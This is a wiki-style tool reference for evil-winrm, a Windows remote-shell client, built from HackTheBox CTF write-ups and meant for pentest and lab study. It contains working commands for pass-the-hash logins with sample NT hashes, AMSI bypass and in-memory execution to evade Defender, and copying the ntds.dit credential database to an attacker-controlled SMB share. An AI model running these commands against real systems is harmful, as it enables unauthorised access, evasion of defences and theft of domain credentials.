---
title: "evil-winrm"
type: tool
tags: [active-directory, lateral-movement, post-exploitation, windows]
date_created: 2026-05-12
date_updated: 2026-07-02
sources: [0xdf-htb-administrator, 0xdf-htb-analysis, 0xdf-htb-anubis, 0xdf-htb-apt, 0xdf-htb-authority, 0xdf-htb-blackfield, 0xdf-htb-cascade, 0xdf-htb-cerberus, 0xdf-htb-coder, 0xdf-htb-compiled, 0xdf-htb-driver, 0xdf-specialty-web]
phase: postex
---

## Purpose

**evil-winrm** is a Ruby-based WinRM shell client for Windows post-exploitation. It provides an interactive PowerShell prompt over WinRM (ports 5985/HTTP and 5986/HTTPS) and includes built-in helpers for file upload/download, AMSI bypass, in-memory binary execution, DLL/script loading, and Kerberos authentication.

## Install / setup

```bash
# RubyGems
sudo gem install evil-winrm

# apt (Kali)
sudo apt install evil-winrm
```

Requires Ruby. The gem is the most reliable install method and gives the latest version.

## Core usage

```bash
evil-winrm -i TARGET -u USER -p PASSWORD
```

### Key flags

| Flag | Description |
|------|-------------|
| `-i HOST` | Target IP or hostname (required) |
| `-u USER` | Username |
| `-p PASSWORD` | Plaintext password |
| `-H HASH` | NTLM hash for pass-the-hash; format: `LM:NT` or just the NT hash |
| `-P PORT` | WinRM port (default: 5985) |
| `-S` | Use SSL/HTTPS (port 5986 by default) |
| `-c CERT` | Client certificate file for certificate-based auth |
| `-k KEY` | Client private key file for certificate-based auth |
| `-r REALM` | Kerberos realm (domain); also requires `/etc/krb5.conf` configuration |
| `-s SCRIPTS_PATH` | Local directory from which PowerShell scripts are served for `IEX` loading |
| `-e EXES_PATH` | Local directory from which executables are served for `Invoke-Binary` |
| `--no-colors` | Disable ANSI colours (useful for log capture) |

## Common use cases

### Password authentication

```bash
evil-winrm -i administrator.htb -u olivia -p ichliebedich
```

Produces a prompt: `*Evil-WinRM* PS C:\Users\olivia\Documents>`

Verify WinRM access first with netexec before connecting:

```bash
netexec winrm target.htb -u user -p password
# Look for (Pwn3d!) in output
```

### Pass-the-hash (PtH)

```bash
evil-winrm -i dc.administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

Pass just the NT portion of the hash. Used after DCSync, secretsdump, or pypykatz extracts hashes. Seen on: administrator (post-DCSync), blackfield (post-SeBackupPrivilege NTDS extraction), coder (CVE-2022-26923), compiled.

```bash
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

From blackfield (older version, same flag behavior).

### Kerberos authentication

```bash
evil-winrm -i earth.windcorp.htb -r windcorp.htb
```

`-r` specifies the Kerberos realm (domain in uppercase conventionally). Requires a valid TGT in the cache (`KRB5CCNAME` environment variable or default ccache) and correct `/etc/krb5.conf` entry. Used after obtaining a certificate or TGT via ADCS exploitation. Seen on anubis.

If the DC has a clock skew greater than 5 minutes, Kerberos auth fails with "Clock skew too great". Use `faketime` to adjust:

```bash
proxychains faketime -f +1h evil-winrm -i earth.windcorp.htb -r windcorp.htb
```

`proxychains` must come before `faketime` in the command. Seen on anubis.

### Through a tunnel (proxychains / chisel)

```bash
proxychains evil-winrm -i 172.16.22.1 -u matthew -p 147258369
# or via localhost after chisel port forward:
evil-winrm -i 127.0.0.1 -u matthew -p 147258369
```

When WinRM is not directly reachable, forward port 5985 through a pivot. Seen on cerberus (chisel tunnel from Linux container to Windows host).

### File upload

```bash
*Evil-WinRM* PS C:\programdata> upload /local/path/file.exe
```

Uploads from the attacker machine to the current remote directory. The destination path is optional; defaults to the current working directory. Common targets: `C:\programdata`, `C:\windows\system32`, `C:\temp`.

Seen on: blackfield (SeBackupPrivilege DLLs), driver (WinPEAS, exploit script), apt (WinPEAS), analysis (malicious DLL), coder (ADCSTemplate module).

### File download

```bash
*Evil-WinRM* PS C:\windows\system32\config> download ntds.dit /local/path/ntds.dit
```

Downloads a remote file to the attacker machine. The built-in `download` can be unreliable for large files; an alternative is to mount an SMB share and copy over it:

```bash
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.14\share /u:df df
*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege Z:\Windows\ntds\ntds.dit \\10.10.14.14\share\ntds.dit
```

Seen on blackfield (ntds.dit exfil), cerberus (ezip backup).

### Loading a PowerShell script into the session

Upload a `.ps1` and dot-source it, or use `Import-Module`:

```bash
*Evil-WinRM* PS C:\programdata> upload /opt/PowerSploit/Recon/PowerView.ps1
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
*Evil-WinRM* PS C:\programdata> Get-DomainObject -Identity 'DC=AUTHORITY,DC=HTB' | select ms-ds-machineaccountquota
```

Seen on: authority (PowerView), coder (ADCSTemplate module), blackfield (SeBackupPrivilegeCmdLets DLLs).

### AMSI bypass and in-memory binary execution

evil-winrm includes built-in helpers accessible from the `menu` command:

```bash
*Evil-WinRM* PS C:\> menu
# shows: Bypass-4MSI, Dll-Loader, Donut-Loader, Invoke-Binary

*Evil-WinRM* PS C:\> Bypass-4MSI
# Patches AMSI in the current process

*Evil-WinRM* PS C:\> Invoke-Binary /local/path/WinPEAS.exe
# Loads and executes an EXE from the attacker machine into memory without writing to disk
```

`Invoke-Binary` caches all output and dumps it after the binary exits, so large tools like WinPEAS require patience. Seen on apt (WinPEAS, Seatbelt both bypassed Defender this way).

**AMSI choreography on dense AD scripting:** Machines like **MultiMaster** deliberately stack telemetry with BloodHound and PowerShell AD tooling. Prefer landing **`Bypass-4MSI` before dot-sourcing large manifests**, then run tight cmdlet batches instead of repetitive `Invoke-Expression` imports that churn AMSI signatures.

## Tips and gotchas

**Check WinRM access before connecting.** Use `netexec winrm` first to confirm the user has WinRM access. HTB writeups consistently show this step. A `(Pwn3d!)` result means the user is in the `Remote Management Users` group or has equivalent rights.

**The shell does not cache credentials for child processes.** Commands like `sc.exe` or certain privilege-sensitive operations may fail with "Access Denied" even as the correct user, because the WinRM session authenticates via a network logon token, not an interactive one. Work around this with `RunasCs.exe`:

```bash
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe Emily 12345678 'sc.exe qc VSStandardCollectorService150'
```

Seen on compiled.

**Windows line endings for uploaded script files.** Script files written on Linux use Unix line endings (`\n`). Some Windows tools (e.g. `diskshadow`) fail to parse them. Run `unix2dos` on the file before uploading. Seen on blackfield (diskshadow VSS script).

**OpenSSL compatibility on Ubuntu hosts.** Newer Ubuntu OpenSSL defaults can cause a connection error:

```
Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused
```

Fix by adding legacy provider settings to `/etc/ssl/openssl.cnf`. Documented in the HTB Forums thread linked in the cerberus writeup.

**Clock skew kills Kerberos auth.** The "Clock skew too great" error means the attacker clock differs from the DC by more than 5 minutes. Use `faketime` with the offset shown in nmap's `clock-skew` script output. Seen on anubis.

**The `-r` realm flag also needs `/etc/krb5.conf`.** For Kerberos auth to work, add a stanza like the following:

```ini
[realms]
WINDCORP.HTB = {
    kdc = earth.windcorp.htb
}
```

**Pass-the-hash requires the NT hash only.** If you have a full `LM:NT` pair (e.g. from secretsdump), pass only the NT portion (32 hex characters after the colon) to `-H`.

**evil-winrm-py is a separate Python implementation** used in darkzero. It has the same basic interface (`-i`, `-u`, `-H`) but is a distinct project, not the standard Ruby gem.

## Related techniques

- [[ad-lateral-movement|AD Lateral Movement]]
- [[Pass-the-Hash]]
- [[active-directory-certificate-esc-attacks|Active Directory Certificate Services (ADCS)]]
- [[kerberos-attacks]]
- SeBackupPrivilege abuse

## Sources

Synthesised from 0xdf HTB writeups: administrator, analysis, anubis, apt, authority, blackfield, cascade, cerberus, coder, compiled, driver, multimaster (`0xdf-specialty-web`).
